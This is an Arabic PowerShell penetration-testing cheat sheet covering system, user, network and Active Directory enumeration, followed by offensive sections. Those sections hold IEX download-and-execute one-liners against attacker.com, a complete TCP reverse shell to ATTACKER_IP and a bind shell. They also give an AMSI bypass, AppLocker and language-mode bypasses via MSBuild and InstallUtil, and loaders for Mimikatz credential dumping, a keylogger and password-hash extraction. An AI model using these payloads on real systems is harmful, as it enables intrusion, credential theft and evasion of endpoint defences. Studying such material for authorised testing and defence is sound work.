<a id="-powershell---complete-pentesting-cheatsheet"></a>
# 💻 PowerShell — دليل مرجعي شامل لاختبار الاختراق

<!-- language-home-navigation -->
[🏠 الصفحة الرئيسية العربية](../../README.ar.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██████╗  ██████╗ ██╗    ██╗███████╗██████╗ ███████╗██╗  ██╗███████╗██╗     ██╗     
  ██╔══██╗██╔═══██╗██║    ██║██╔════╝██╔══██╗██╔════╝██║  ██║██╔════╝██║     ██║     
  ██████╔╝██║   ██║██║ █╗ ██║█████╗  ██████╔╝███████╗███████║█████╗  ██║     ██║     
  ██╔═══╝ ██║   ██║██║███╗██║██╔══╝  ██╔══██╗╚════██║██╔══██║██╔══╝  ██║     ██║     
  ██║     ╚██████╔╝╚███╔███╔╝███████╗██║  ██║███████║██║  ██║███████╗███████╗███████╗
  ╚═╝      ╚═════╝  ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
```

<p align="center">
  <img src="https://img.shields.io/badge/PowerShell-blue?style=for-the-badge&logo=powershell" alt="PowerShell">
  <img src="https://img.shields.io/badge/Windows-Hacking-red?style=for-the-badge" alt="Hacking">
  <img src="https://img.shields.io/badge/Post_Exploitation-orange?style=for-the-badge" alt="Post-Exploitation">
</p>

---

<a id="-table-of-contents"></a>
## 📋 جدول المحتويات

- [الأساسيات](#-basics)
- [حصر معلومات النظام](#-system-enumeration)
- [حصر المستخدمين](#-user-enumeration)
- [أوامر الشبكة](#-network-commands)
- [عمليات الملفات](#-file-operations)
- [إدارة العمليات والخدمات](#-process--service-management)
- [عمليات سجل Windows](#-registry-operations)
- [خدمة الدليل النشط (Active Directory)](#-active-directory)
- [التنزيل والتنفيذ](#-download--execution)
- [الصدفات العكسية (Reverse Shells)](#-reverse-shells)
- [تقنيات التجاوز](#-bypass-techniques)
- [الأدوات الهجومية](#-offensive-tools)
- [أوامر في سطر واحد](#-one-liners)

---

<a id="-basics"></a>
## 🔰 الأساسيات

> **ملاحظة الإصدارات:** كثير من الأمثلة يستهدف Windows PowerShell 5.1 وأدوات Windows. توضح [وثائق Microsoft](https://learn.microsoft.com/en-us/powershell/scripting/whats-new/differences-from-windows-powershell) أن `Get-WmiObject` و`Get-EventLog` غير متاحين في PowerShell 7، وتختلف الوحدات والأسماء المستعارة حسب البيئة. حُفظت أوامر الأصل دون تحديث تنفيذي.


<a id="execution-policy"></a>
### سياسة التنفيذ (Execution Policy)

> **توضيح:** وفق [Microsoft](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies)، سياسة التنفيذ ليست حداً أمنياً. ضبط `Process` يخص العملية الحالية، أما `CurrentUser` فيخص المستخدم ويستمر بعد إغلاقها؛ لا يعني تغيير السياسة تجاوز AMSI أو قيود التطبيق.


```powershell
# فحص السياسة الحالية
Get-ExecutionPolicy
Get-ExecutionPolicy -List

# تجاوز سياسة التنفيذ للجلسة الحالية
Set-ExecutionPolicy Bypass -Scope Process
Set-ExecutionPolicy Unrestricted -Scope CurrentUser

# تشغيل سكربت مع تجاوز السياسة
powershell -ExecutionPolicy Bypass -File script.ps1
powershell -ep bypass -File script.ps1
```

<a id="getting-help"></a>
### الحصول على المساعدة

```powershell
# الحصول على مساعدة لأمر
Get-Help Get-Process
Get-Help Get-Process -Full
Get-Help Get-Process -Examples

# تحديث المساعدة
Update-Help

# عرض جميع الأوامر
Get-Command
Get-Command -Module ActiveDirectory
Get-Command *process*
```

<a id="variables--operators"></a>
### المتغيرات والعوامل

```powershell
# المتغيرات
$var = "value"
$number = 42
$array = @(1, 2, 3)
$hash = @{key="value"; name="test"}

# متغيرات البيئة
$env:USERNAME
$env:COMPUTERNAME
$env:USERDOMAIN
$env:PATH
Get-ChildItem Env:

# عوامل المقارنة
-eq   # يساوي
-ne   # لا يساوي
-gt   # أكبر من
-lt   # أصغر من
-like # مطابقة أحرف البدل
-match # مطابقة تعبير نمطي (Regex)
```

<a id="piping--filtering"></a>
### تمرير المخرجات عبر الأنابيب والتصفية

```powershell
# تمرير المخرجات عبر الأنبوب
Get-Process | Where-Object {$_.CPU -gt 10}
Get-Service | Where-Object Status -eq "Running"

# اختيار الخصائص
Get-Process | Select-Object Name, CPU, Id
Get-Process | Select-Object -First 5

# الفرز
Get-Process | Sort-Object CPU -Descending

# تنسيق المخرجات
Get-Process | Format-Table -AutoSize
Get-Process | Format-List *
Get-Process | Out-GridView
```

---

<a id="-system-enumeration"></a>
## 🔍 حصر معلومات النظام

<a id="system-information"></a>
### معلومات النظام

```powershell
# معلومات الحاسوب
Get-ComputerInfo
systeminfo
hostname
$env:COMPUTERNAME

# إصدار نظام التشغيل
[System.Environment]::OSVersion
(Get-WmiObject Win32_OperatingSystem).Caption
(Get-CimInstance Win32_OperatingSystem).Version

# المعمارية
[Environment]::Is64BitOperatingSystem
$env:PROCESSOR_ARCHITECTURE

# الإصلاحات العاجلة والتصحيحات
Get-HotFix
Get-HotFix | Where-Object InstalledOn -gt (Get-Date).AddDays(-30)
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

<a id="installed-software"></a>
### البرمجيات المثبتة

```powershell
# برمجيات 64 بت
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | 
    Select-Object DisplayName, Publisher, InstallDate

# برمجيات 32 بت على نظام 64 بت
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | 
    Select-Object DisplayName, Publisher, InstallDate

# استخدام WMI
Get-WmiObject -Class Win32_Product | Select-Object Name, Version

# قائمة سريعة
Get-Package
```

<a id="antivirus--security"></a>
### مكافحة الفيروسات والأمن

```powershell
# عرض مكافحة الفيروسات
Get-WmiObject -Namespace root\SecurityCenter2 -Class AntiVirusProduct
Get-MpComputerStatus  # مكافحة الفيروسات Windows Defender

# حالة جدار الحماية
Get-NetFirewallProfile
netsh advfirewall show allprofiles

# قواعد جدار الحماية
Get-NetFirewallRule | Where-Object Enabled -eq True
Get-NetFirewallRule -DisplayName "*Remote*"

# استثناءات Windows Defender
Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
```

<a id="scheduled-tasks"></a>
### المهام المجدولة

```powershell
# عرض المهام المجدولة
Get-ScheduledTask
Get-ScheduledTask | Where-Object State -eq "Ready"

# تفاصيل المهمة
Get-ScheduledTask -TaskName "TaskName" | Get-ScheduledTaskInfo

# schtasks
schtasks /query /fo LIST /v
```

---

<a id="-user-enumeration"></a>
## 👤 حصر المستخدمين

<a id="local-users"></a>
### المستخدمون المحليون

```powershell
# المستخدم الحالي
whoami
$env:USERNAME
[Environment]::UserName
[System.Security.Principal.WindowsIdentity]::GetCurrent().Name

# جميع المستخدمين المحليين
Get-LocalUser
Get-LocalUser | Select-Object Name, Enabled, LastLogon
net user

# تفاصيل المستخدم
Get-LocalUser Administrator
net user Administrator

# مجموعات المستخدم
Get-LocalGroupMember Administrators
net localgroup Administrators
```

<a id="user-privileges"></a>
### صلاحيات المستخدم

```powershell
# الصلاحيات الحالية
whoami /priv
whoami /all
whoami /groups

# التحقق من صلاحيات المسؤول
([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
```

<a id="groups"></a>
### المجموعات

```powershell
# عرض المجموعات المحلية
Get-LocalGroup
net localgroup

# أعضاء المجموعة
Get-LocalGroupMember "Administrators"
Get-LocalGroupMember "Remote Desktop Users"
net localgroup "Administrators"
```

<a id="logged-in-users"></a>
### المستخدمون المسجلون حالياً

```powershell
# المستخدمون المسجلون الآن
query user
quser
qwinsta

# عمليات تسجيل الدخول الحديثة
Get-WmiObject Win32_LogonSession | Select-Object LogonId, LogonType, StartTime
Get-EventLog -LogName Security -InstanceId 4624 -Newest 10
```

---

<a id="-network-commands"></a>
## 🌐 أوامر الشبكة

<a id="network-configuration"></a>
### إعداد الشبكة

```powershell
# إعدادات IP
Get-NetIPConfiguration
Get-NetIPAddress
ipconfig /all

# DNS
Get-DnsClientServerAddress
ipconfig /displaydns

# المسارات
Get-NetRoute
route print

# جدول ARP
Get-NetNeighbor
arp -a
```

<a id="open-ports--connections"></a>
### المنافذ المفتوحة والاتصالات

```powershell
# اتصالات TCP
Get-NetTCPConnection
Get-NetTCPConnection -State Listen
Get-NetTCPConnection | Where-Object State -eq "Established"
netstat -ano

# نقاط اتصال UDP
Get-NetUDPEndpoint

# تحديد العملية بحسب المنفذ
Get-NetTCPConnection -LocalPort 80 | Select-Object OwningProcess
Get-Process -Id (Get-NetTCPConnection -LocalPort 80).OwningProcess
```

<a id="network-testing"></a>
### اختبار الشبكة

```powershell
# Ping
Test-Connection google.com
Test-Connection -ComputerName 192.168.1.1 -Count 4

# فحص منفذ
Test-NetConnection -ComputerName 192.168.1.1 -Port 445
Test-NetConnection -ComputerName google.com -Port 443

# تتبّع المسار
Test-NetConnection -ComputerName google.com -TraceRoute

# استعلام DNS
Resolve-DnsName google.com
nslookup google.com
```

<a id="network-shares"></a>
### مشاركات الشبكة

```powershell
# عرض المشاركات
Get-SmbShare
net share

# ربط قرص شبكة
New-PSDrive -Name Z -PSProvider FileSystem -Root "\\server\share"
net use Z: \\server\share

# عرض المشاركات المتصل بها
Get-SmbConnection
net use

# الوصول إلى مشاركة
Get-ChildItem \\server\share
dir \\192.168.1.1\c$
```

---

<a id="-file-operations"></a>
## 📁 عمليات الملفات

<a id="navigation--listing"></a>
### التنقل وعرض الملفات

> **ملاحظة الصدفة:** يخلط الأصل بعض أوامر CMD مثل `dir /a:h` و`dir /r` وإعادة التوجيه `<` مع أمثلة PowerShell. يوضح [توثيق الأسماء المستعارة](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_aliases) أن `dir` في PowerShell اسم بديل لـ `Get-ChildItem`؛ لا تفترض تطابق معاملات CMD معه. حدد الصدفة المناسبة قبل استخدام المثال.


```powershell
# المجلد الحالي
Get-Location
pwd

# تغيير المجلد
Set-Location C:\Users
cd C:\Users

# عرض الملفات
Get-ChildItem
Get-ChildItem -Force  # تضمين الملفات المخفية
Get-ChildItem -Recurse
ls
dir

# عرض الملفات المخفية
Get-ChildItem -Hidden
Get-ChildItem -Attributes Hidden
dir /a:h
```

<a id="file-search"></a>
### البحث عن الملفات

```powershell
# البحث عن الملفات بالاسم
Get-ChildItem -Path C:\ -Recurse -Name "*.txt" -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\ -Recurse -Filter "password*" -ErrorAction SilentlyContinue

# البحث عن ملفات تتضمن نصاً
Get-ChildItem -Recurse | Select-String "password"
Select-String -Path "C:\*.txt" -Pattern "password"

# البحث عن الملفات الكبيرة
Get-ChildItem -Recurse | Where-Object Length -gt 100MB

# البحث عن الملفات المعدلة حديثاً
Get-ChildItem -Recurse | Where-Object LastWriteTime -gt (Get-Date).AddDays(-7)
```

<a id="read--write-files"></a>
### قراءة الملفات وكتابتها

```powershell
# قراءة ملف
Get-Content file.txt
Get-Content file.txt -Head 10
Get-Content file.txt -Tail 10
type file.txt
cat file.txt

# الكتابة إلى ملف
Set-Content file.txt "content"
Add-Content file.txt "append"
"content" | Out-File file.txt
"content" >> file.txt  # الإلحاق

# النسخ والنقل والحذف
Copy-Item source.txt destination.txt
Move-Item source.txt destination.txt
Remove-Item file.txt
Remove-Item folder -Recurse -Force
```

<a id="alternate-data-streams-ads"></a>
### تدفقات البيانات البديلة (ADS)

```powershell
# عرض تدفقات ADS
Get-Item file.txt -Stream *
dir /r file.txt

# قراءة تدفق ADS
Get-Content file.txt -Stream secret
more < file.txt:secret

# الكتابة إلى تدفق ADS
Set-Content file.txt -Stream hidden "secret data"
echo "data" > file.txt:hidden

# حذف تدفق ADS
Remove-Item file.txt -Stream hidden
```

<a id="hashing"></a>
### حساب البصمات (Hashing)

```powershell
# حساب بصمة ملف
Get-FileHash file.txt
Get-FileHash file.txt -Algorithm MD5
Get-FileHash file.txt -Algorithm SHA256
Get-FileHash file.txt -Algorithm SHA512

# التحقق من البصمة
(Get-FileHash file.txt).Hash -eq "expected_hash"
```

---

<a id="-process--service-management"></a>
## ⚙️ إدارة العمليات والخدمات

<a id="processes"></a>
### العمليات

```powershell
# عرض العمليات
Get-Process
Get-Process | Sort-Object CPU -Descending
Get-Process -Name "chrome"
tasklist

# تفاصيل العملية
Get-Process -Id 1234 | Format-List *
Get-WmiObject Win32_Process | Select-Object Name, ProcessId, CommandLine

# بدء عملية
Start-Process notepad.exe
Start-Process -FilePath "cmd.exe" -ArgumentList "/c whoami"
Start-Process -FilePath "powershell.exe" -Verb RunAs  # بصلاحيات مسؤول

# إيقاف عملية
Stop-Process -Name "notepad"
Stop-Process -Id 1234 -Force
taskkill /PID 1234 /F
```

<a id="services"></a>
### الخدمات

> **ملاحظة على `sc query`:** يوثق [Microsoft](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/set-content?view=powershell-5.1) الاسم المستعار `sc` للأمر `Set-Content` في Windows PowerShell، بدلاً من أداة التحكم بالخدمات؛ لذا لا تفترض أن هذا السطر ينفّذ الاستعلام المتوقع. احتُفظ بالسطر الحرفي من الأصل.


```powershell
# عرض الخدمات
Get-Service
Get-Service | Where-Object Status -eq "Running"
Get-Service | Where-Object StartType -eq "Automatic"
sc query

# تفاصيل الخدمة
Get-Service -Name "WinRM" | Format-List *
Get-WmiObject Win32_Service | Select-Object Name, StartMode, PathName

# تشغيل الخدمات وإيقافها
Start-Service -Name "WinRM"
Stop-Service -Name "WinRM"
Restart-Service -Name "WinRM"
net start WinRM
net stop WinRM

# مسار الخدمة لفحص غياب علامات الاقتباس
Get-WmiObject Win32_Service | Select-Object Name, PathName | Where-Object {$_.PathName -notlike '"*'}
```

---

<a id="-registry-operations"></a>
## 📝 عمليات سجل Windows

<a id="reading-registry"></a>
### قراءة السجل

```powershell
# عرض مفاتيح السجل
Get-ChildItem HKLM:\SOFTWARE
Get-ChildItem HKCU:\SOFTWARE

# قراءة قيمة من السجل
Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Get-ItemPropertyValue HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run -Name "SecurityHealth"

# البحث في السجل
Get-ChildItem HKLM:\ -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.Name -match "password"}
```

<a id="writing-registry"></a>
### الكتابة إلى السجل

```powershell
# إنشاء مفتاح
New-Item -Path HKCU:\SOFTWARE\MyKey

# ضبط قيمة
Set-ItemProperty -Path HKCU:\SOFTWARE\MyKey -Name "Value" -Value "Data"
New-ItemProperty -Path HKCU:\SOFTWARE\MyKey -Name "NewValue" -Value "Data" -PropertyType String

# الحذف
Remove-ItemProperty -Path HKCU:\SOFTWARE\MyKey -Name "Value"
Remove-Item -Path HKCU:\SOFTWARE\MyKey -Recurse
```

<a id="important-registry-locations"></a>
### مواقع مهمة في السجل

```powershell
# مواقع التشغيل التلقائي
Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Get-ItemProperty HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

# مفاتيح إزالة التثبيت للبرامج المثبتة
Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*

# قاعدة SAM (تتطلب SYSTEM وفق الأصل)
# HKLM:\SAM\SAM

# أسرار LSA
# HKLM:\SECURITY\Policy\Secrets
```

---

<a id="-active-directory"></a>
## 🏢 خدمة الدليل النشط (Active Directory)

> **ملاحظة الوحدات:** أوامر `Get-AD*` و`Get-GPO*` تفترض توافر وحدات ActiveDirectory وGroupPolicy وصلاحيات الاتصال المناسبة؛ ليست جميعها أوامر مضمّنة تلقائياً في كل جلسة PowerShell.


<a id="domain-information"></a>
### معلومات المجال

```powershell
# معلومات المجال
Get-ADDomain
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$env:USERDNSDOMAIN

# متحكمات المجال
Get-ADDomainController
Get-ADDomainController -Filter * | Select-Object Name, IPv4Address

# معلومات الغابة (Forest)
Get-ADForest

# علاقات الثقة
Get-ADTrust -Filter *
```

<a id="user-enumeration-ad"></a>
### حصر مستخدمي Active Directory

```powershell
# جميع مستخدمي المجال
Get-ADUser -Filter *
Get-ADUser -Filter * -Properties *
Get-ADUser -Filter * | Select-Object Name, SamAccountName, Enabled

# مستخدم محدد
Get-ADUser -Identity administrator -Properties *

# مستخدمون ذوو خاصية محددة
Get-ADUser -Filter {AdminCount -eq 1}  # المسؤولون
Get-ADUser -Filter {ServicePrincipalName -ne "$null"}  # حسابات قابلة لفحص Kerberoasting وفق وصف الأصل

# البحث عن المستخدمين
Get-ADUser -Filter {Name -like "*admin*"}
Get-ADUser -Filter {Description -like "*password*"}
```

<a id="group-enumeration-ad"></a>
### حصر مجموعات Active Directory

```powershell
# جميع المجموعات
Get-ADGroup -Filter *

# مجموعة Domain Admins
Get-ADGroupMember "Domain Admins"
Get-ADGroupMember "Domain Admins" -Recursive

# مجموعة Enterprise Admins
Get-ADGroupMember "Enterprise Admins"

# مجموعات المستخدم
Get-ADPrincipalGroupMembership username
```

<a id="computer-enumeration-ad"></a>
### حصر أجهزة Active Directory

```powershell
# جميع أجهزة الحاسوب
Get-ADComputer -Filter *
Get-ADComputer -Filter * -Properties *

# متحكمات المجال
Get-ADComputer -Filter {PrimaryGroupId -eq 516}

# الخوادم
Get-ADComputer -Filter {OperatingSystem -like "*Server*"}
```

<a id="gpo-information"></a>
### معلومات كائنات نهج المجموعة (GPO)

```powershell
# عرض كائنات GPO
Get-GPO -All
Get-GPO -All | Select-Object DisplayName, GpoStatus

# تفاصيل GPO
Get-GPO -Name "Default Domain Policy"

# تقرير GPO
Get-GPOReport -Name "Default Domain Policy" -ReportType HTML -Path report.html
```

---

<a id="-download--execution"></a>
## ⬇️ التنزيل والتنفيذ

<a id="download-files"></a>
### تنزيل الملفات

```powershell
# استخدام Invoke-WebRequest بوصفه مقابلاً لـ wget/curl وفق الأصل
Invoke-WebRequest -Uri "http://attacker.com/file.exe" -OutFile "file.exe"
iwr -Uri "http://attacker.com/file.exe" -OutFile "file.exe"
wget "http://attacker.com/file.exe" -OutFile "file.exe"

# استخدام WebClient (أسرع وفق وصف الأصل)
(New-Object Net.WebClient).DownloadFile("http://attacker.com/file.exe", "C:\file.exe")

# تنزيل سلسلة نصية للسكربتات
(New-Object Net.WebClient).DownloadString("http://attacker.com/script.ps1")

# Invoke-RestMethod
Invoke-RestMethod -Uri "http://attacker.com/file.exe" -OutFile "file.exe"

# النقل عبر BITS (أقل ظهوراً وفق وصف الأصل)
Start-BitsTransfer -Source "http://attacker.com/file.exe" -Destination "file.exe"

# أداة النظام الأصلية certutil (LOLBin)
certutil -urlcache -split -f "http://attacker.com/file.exe" file.exe
```

<a id="download--execute-in-memory"></a>
### التنزيل والتنفيذ في الذاكرة

```powershell
# IEX — Invoke-Expression للتنفيذ دون حفظ ملف سكربت
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')
IEX (iwr 'http://attacker.com/script.ps1')

# باستخدام متغير
$script = (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')
IEX $script

# Invoke-الأمر
Invoke-Command -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')}
```

<a id="encoded-execution"></a>
### تنفيذ أوامر مرمّزة

```powershell
# ترميز الأمر بصيغة Base64
$command = "whoami"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encoded = [Convert]::ToBase64String($bytes)
echo $encoded

# تنفيذ الأمر المرمّز
powershell -enc <base64_string>
powershell -EncodedCommand <base64_string>

# أداة ترميز في سطر واحد
[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')"))
```

---

<a id="-reverse-shells"></a>
## 🔌 الصدفات العكسية (Reverse Shells)

<a id="powershell-reverse-shell"></a>
### صدفة عكسية باستخدام PowerShell

```powershell
# صدفة عكسية عبر TCP
$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4444)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close()
```

<a id="one-liner-reverse-shell"></a>
### صدفة عكسية في سطر واحد

```powershell
# Nishang
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/Invoke-PowerShellTcp.ps1')
Invoke-PowerShellTcp -Reverse -IPAddress ATTACKER_IP -Port 4444

# PowerCat
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/powercat.ps1')
powercat -c ATTACKER_IP -p 4444 -e cmd

# Powerline
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

<a id="bind-shell"></a>
### صدفة تستمع لاتصال وارد (Bind Shell)

```powershell
# الاستماع على منفذ
$listener = [System.Net.Sockets.TcpListener]4444
$listener.Start()
$client = $listener.AcceptTcpClient()
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close()
$listener.Stop()
```

---

<a id="-bypass-techniques"></a>
## 🛡️ تقنيات التجاوز

<a id="execution-policy-bypass"></a>
### تجاوز سياسة التنفيذ

```powershell
# طرق التجاوز
powershell -ep bypass
powershell -ExecutionPolicy Bypass
Set-ExecutionPolicy Bypass -Scope Process

# القراءة والتمرير عبر أنبوب
Get-Content script.ps1 | PowerShell -NoProfile -
type script.ps1 | PowerShell -NoProfile -

# تنزيل سلسلة نصية دون ملف على القرص
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')
```

<a id="amsi-bypass"></a>
### تجاوز واجهة فحص البرمجيات الضارة (AMSI)

> **تصحيح للمثال:** قسم تعديل الذاكرة يعرّف تصريحات دوال فقط، ثم ينتهي بالتعليق `# ... (full bypass code)`؛ لا يتضمن الشيفرة الكاملة لتعديل AMSI. كما يستخدم `IntPtr` و`UIntPtr` دون استيراد مساحة الأسماء `System` في نص C# المعروض. يُقرأ كمقطع ناقص، وليس تجاوزاً جاهزاً. أمثلة الانعكاس الأخرى تعتمد على الإصدار والحماية.


```powershell
# تجاوز AMSI بسيط قد يُرصد
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# مموّه
$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b=$a.GetField('amsiInitFailed','NonPublic,Static')
$b.SetValue($null,$true)

# تعديل الذاكرة (يتطلب مسؤولاً وفق الأصل)
$win32 = @"
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $win32
# ... (موضع بقية شيفرة التجاوز)
```

<a id="constrained-language-mode-bypass"></a>
### تجاوز وضع اللغة المقيّدة (Constrained Language Mode)

```powershell
# فحص وضع اللغة
$ExecutionContext.SessionState.LanguageMode

# إذا كان الوضع ConstrainedLanguage فجرّب وفق الأصل:
# - PowerShell 2.0 إذا كان متاحاً
powershell -version 2

# - InstallUtil
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe
```

<a id="applocker-bypass"></a>
### تجاوز AppLocker

```powershell
# MSBuild
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.xml

# InstallUtil
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false payload.exe

# Regasm/Regsvcs
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U payload.dll

# فحص قواعد AppLocker
Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections
```

---

<a id="-offensive-tools"></a>
## 🔫 الأدوات الهجومية

<a id="powersploit"></a>
### PowerSploit

```powershell
# التنزيل
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/PowerSploit/Recon/PowerView.ps1')

# PowerView لحصر معلومات Active Directory
Get-NetDomain
Get-NetUser
Get-NetGroup
Get-NetComputer
Find-LocalAdminAccess
Invoke-UserHunter

# PowerUp لتصعيد الصلاحيات
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/PowerUp.ps1')
Invoke-AllChecks

# Invoke-Mimikatz
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
```

<a id="empirepowershell-empire"></a>
### Empire/PowerShell Empire

```powershell
# تنفيذ مرحلة التحميل الأولية (Stager) من Empire
powershell -noP -sta -w 1 -enc <base64_payload>
```

<a id="nishang"></a>
### Nishang

```powershell
# صدفة عكسية
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/nishang/Shells/Invoke-PowerShellTcp.ps1')
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.10.10 -Port 4444

# مسجل ضغطات المفاتيح
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/nishang/Gather/Keylogger.ps1')
Keylogger

# Get-PassHashes
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/nishang/Gather/Get-PassHashes.ps1')
Get-PassHashes
```

---

<a id="-one-liners"></a>
## ⚡ أوامر في سطر واحد

<a id="enumeration-one-liners"></a>
### أوامر الحصر في سطر واحد

```powershell
# معلومات النظام
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"

# المستخدمون
Get-LocalUser | Select Name,Enabled

# البرمجيات المثبتة
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select DisplayName

# المنافذ المفتوحة
Get-NetTCPConnection -State Listen | Select LocalAddress,LocalPort,OwningProcess

# الخدمات قيد التشغيل
Get-Service | Where Status -eq Running | Select Name,DisplayName

# المهام المجدولة
schtasks /query /fo TABLE | findstr /v "TaskName"

# حالة مكافحة الفيروسات
Get-MpComputerStatus | Select RealTimeProtectionEnabled,IoavProtectionEnabled

# جدار الحماية
Get-NetFirewallProfile | Select Name,Enabled
```

<a id="download-one-liners"></a>
### أوامر التنزيل في سطر واحد

```powershell
# التنزيل باستخدام PowerShell
(New-Object Net.WebClient).DownloadFile("http://url/file","C:\file")
IEX (New-Object Net.WebClient).DownloadString("http://url/script.ps1")
Invoke-WebRequest -Uri "http://url/file" -OutFile "file"

# certutil
certutil -urlcache -split -f "http://url/file" file

# bitsadmin
bitsadmin /transfer job /download /priority high http://url/file C:\file
```

<a id="command-table"></a>
### جدول الأوامر

| الغرض | الأمر |
|---------|---------|
| المستخدم الحالي | `whoami` |
| جميع المستخدمين | `Get-LocalUser` |
| المسؤولون | `Get-LocalGroupMember Administrators` |
| معلومات النظام | `systeminfo` |
| إعدادات IP | `Get-NetIPAddress` |
| المنافذ المفتوحة | `Get-NetTCPConnection -State Listen` |
| العمليات | `Get-Process` |
| الخدمات | `Get-Service \| Where Status -eq Running` |
| البحث عن الملفات | `Get-ChildItem -Recurse -Filter "*.txt"` |
| البحث في المحتوى | `Select-String -Path "C:\*" -Pattern "password"` |
| تنزيل ملف | `(New-Object Net.WebClient).DownloadFile("url","file")` |
| تنفيذ مرمّز | `powershell -enc <base64>` |

---

<a id="-resources"></a>
## 📚 المراجع

- [PowerSploit](https://github.com/PowerShellMafia/PowerSploit)
- [Nishang](https://github.com/samratashok/nishang)
- [PowerShell Empire](https://github.com/EmpireProject/Empire)
- [LOLBAS](https://lolbas-project.github.io/)
- [قسم PowerShell في HackTricks](https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters)

<a id="related-cheatsheets"></a>
### أدلة مرجعية ذات صلة
- [Mimikatz](../../Mimikatz/translations/README.ar.md)
- [تصعيد الصلاحيات في Windows](../../Windows-PrivEsc/README.md)
- [Metasploit](../../Metasploit/translations/README.ar.md)

---

<p align="center">
  <b>💻 أتقن PowerShell لاختبار الاختراق!</b><br>
  <i>لغة Windows الأقوى لكتابة السكربتات وفق وصف الأصل</i>
</p>
